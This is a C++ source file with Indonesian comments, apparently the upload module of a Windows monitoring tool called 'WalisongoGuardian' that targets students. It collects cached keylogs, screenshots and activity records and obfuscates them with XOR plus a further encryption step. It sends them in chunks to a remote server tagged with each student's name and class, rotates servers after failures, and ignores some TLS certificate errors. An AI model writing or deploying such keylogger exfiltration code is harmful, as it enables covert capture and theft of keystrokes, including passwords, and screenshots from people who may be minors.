#include "transmission.h"
#include "config.h"
#include "globals.h"
#include "utils.h"
#include "encryption.h"
#include "network_gate.h" 
#include <wininet.h>
#include <iostream>
#include <fstream>
#include <chrono>
#include <thread>
#include <algorithm>
#include <filesystem>
#include <mutex>

#pragma comment(lib, "wininet.lib")

// Mutex global khusus untuk melindungi akses ke Config::DYNAMIC_SERVER_URL
static std::mutex g_urlMtx;

/**
 * Parameter overrideUrl: Jika diisi, fungsi akan mengirim data ke URL tersebut.
 * Jika kosong, fungsi akan mengambil dari Config::DYNAMIC_SERVER_URL.
 */
bool PostDataChunked(const std::vector<BYTE>& chunk, std::string type, std::string fname, 
                     std::string fileID, int chunkNum, int chunkTotal, std::string overrideUrl) {

    std::string finalUrl;

    // Proteksi pembacaan URL global dengan mutex
    {
        std::lock_guard<std::mutex> lock(g_urlMtx);
        finalUrl = overrideUrl.empty() ? Config::DYNAMIC_SERVER_URL : overrideUrl;
    }

    if (finalUrl.empty()) {
        #ifdef _DEBUG
        std::cerr << "[ERROR] Server URL kosong!" << std::endl;
        #endif
        return false; 
    }
    
    HINTERNET hInt = InternetOpenA("WalisongoGuardian/1.5", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInt) return false;

    URL_COMPONENTSA url = { sizeof(url) };
    char host[256], path[1024];
    url.lpszHostName = host; url.dwHostNameLength = 256;
    url.lpszUrlPath = path; url.dwUrlPathLength = 1024;

    if (!InternetCrackUrlA(finalUrl.c_str(), 0, 0, &url)) {
        InternetCloseHandle(hInt);
        return false;
    }

    INTERNET_PORT port = (url.nScheme == INTERNET_SCHEME_HTTPS) ? 443 : url.nPort;
    if (port == 0) port = (url.nScheme == INTERNET_SCHEME_HTTPS) ? 443 : 80;
    
    // Tambahkan flag IGNORE_CERT untuk menangani sertifikat SSL yang tidak valid/self-signed
    DWORD httpFlags = INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_RELOAD | INTERNET_FLAG_PRAGMA_NOCACHE;
    if (url.nScheme == INTERNET_SCHEME_HTTPS) {
        httpFlags |= INTERNET_FLAG_SECURE | INTERNET_FLAG_IGNORE_CERT_CN_INVALID | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID;
    }

    HINTERNET hConn = InternetConnectA(hInt, host, port, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (!hConn) { 
        InternetCloseHandle(hInt); 
        return false; 
    }

    HINTERNET hReq = HttpOpenRequestA(hConn, "POST", path, NULL, NULL, NULL, httpFlags, 0);
    if (!hReq) { 
        InternetCloseHandle(hConn); 
        InternetCloseHandle(hInt); 
        return false; 
    }

    // Setting timeout agar tidak menggantung jika koneksi buruk
    DWORD timeout = 20000; // 20 detik
    InternetSetOptionA(hReq, INTERNET_OPTION_CONNECT_TIMEOUT, &timeout, sizeof(timeout));
    InternetSetOptionA(hReq, INTERNET_OPTION_SEND_TIMEOUT, &timeout, sizeof(timeout));
    InternetSetOptionA(hReq, INTERNET_OPTION_RECEIVE_TIMEOUT, &timeout, sizeof(timeout));

    // Bersihkan nama file dari karakter yang mungkin merusak header HTTP
    std::string safeFname = fname;
    safeFname.erase(std::remove(safeFname.begin(), safeFname.end(), '\n'), safeFname.end());
    safeFname.erase(std::remove(safeFname.begin(), safeFname.end(), '\r'), safeFname.end());

    std::string headers = "X-API-Key: " + Config::RAW_API_KEY + "\r\n" +
                          "X-Client-Version: " + Config::CLIENT_VERSION + "\r\n" +
                          "X-ID: " + SYSTEM_ID + "\r\n" +
                          "X-User: " + STUDENT_NAME + " [" + STUDENT_CLASS + "]\r\n" +
                          "X-Type: " + type + "\r\n" +
                          "X-Filename: " + safeFname + "\r\n" +
                          "X-File-ID: " + fileID + "\r\n" +
                          "X-Chunk-Num: " + std::to_string(chunkNum) + "\r\n" +
                          "X-Chunk-Total: " + std::to_string(chunkTotal) + "\r\n" +
                          "Content-Type: application/octet-stream\r\n";

    BOOL res = HttpSendRequestA(hReq, headers.c_str(), (DWORD)headers.length(), 
                                (LPVOID)chunk.data(), (DWORD)chunk.size());
    
    DWORD dwStatusCode = 0;
    DWORD dwSize = sizeof(dwStatusCode);
    HttpQueryInfoA(hReq, HTTP_QUERY_STATUS_CODE | HTTP_QUERY_FLAG_NUMBER, &dwStatusCode, &dwSize, NULL);

    #ifdef _DEBUG
    if (!res) std::cerr << "[ERROR] HttpSendRequest gagal: " << GetLastError() << std::endl;
    else std::cout << "[SEND] URL: " << host << path << " | Status: " << dwStatusCode << std::endl;
    #endif

    InternetCloseHandle(hReq);
    InternetCloseHandle(hConn);
    InternetCloseHandle(hInt);
    
    return (res == TRUE && dwStatusCode == 200);
}

void ProcessOfflineQueue() {
    std::vector<std::string> types = {"activity", "keylog", "screenshot"};
    static int failCounter = 0;
    
    // Seed random sekali
    static bool seeded = false;
    if (!seeded) { srand((unsigned int)time(NULL)); seeded = true; }

    for (auto& t : types) {
        std::filesystem::path p = GetCache(t);
        if (!std::filesystem::exists(p)) continue;

        std::error_code ec;
        for (auto& entry : std::filesystem::directory_iterator(p, ec)) {
            if (ec) break;

            // Gunakan metode pembacaan file yang lebih efisien untuk file besar
            std::ifstream f(entry.path(), std::ios::binary | std::ios::ate);
            if (!f.is_open()) continue;
            
            std::streamsize size = f.tellg();
            if (size <= 0) { f.close(); std::filesystem::remove(entry.path()); continue; }
            
            f.seekg(0, std::ios::beg);
            std::vector<BYTE> buf(static_cast<size_t>(size));
            if (!f.read(reinterpret_cast<char*>(buf.data()), size)) { f.close(); continue; }
            f.close();

            // Enkripsi sebelum dikirim
            XORData(buf);
            FinalEncryption(buf);

            std::string fileID = std::to_string(time(NULL)) + "_" + std::to_string(rand() % 10000);
            size_t totalChunks = (buf.size() + Config::CHUNK_SIZE - 1) / Config::CHUNK_SIZE;
            bool successAll = true;

            for (size_t i = 0; i < totalChunks; i++) {
                size_t start = i * Config::CHUNK_SIZE;
                size_t length = std::min(Config::CHUNK_SIZE, buf.size() - start);
                
                // Akses data langsung tanpa membuat vector baru yang mahal jika memungkinkan
                std::vector<BYTE> chunk(buf.begin() + start, buf.begin() + start + length);

                if (!PostDataChunked(chunk, t, entry.path().filename().string(), fileID, (int)i, (int)totalChunks)) {
                    failCounter++;
                    if (failCounter >= 3) {
                        std::lock_guard<std::mutex> lock(g_urlMtx);
                        RefreshDynamicLink(); // Mencoba ganti server jika gagal terus
                        failCounter = 0;
                    }
                    successAll = false;
                    break; 
                }
                failCounter = 0;
                // Jeda pendek antar chunk untuk stabilitas koneksi
                std::this_thread::sleep_for(std::chrono::milliseconds(150));
            }

            if (successAll) {
                std::error_code removeEc;
                std::filesystem::remove(entry.path(), removeEc);
            } else {
                // Jika satu file gagal, berhenti sejenak sebelum mencoba file berikutnya
                std::this_thread::sleep_for(std::chrono::seconds(5));
            }
        }
    }
}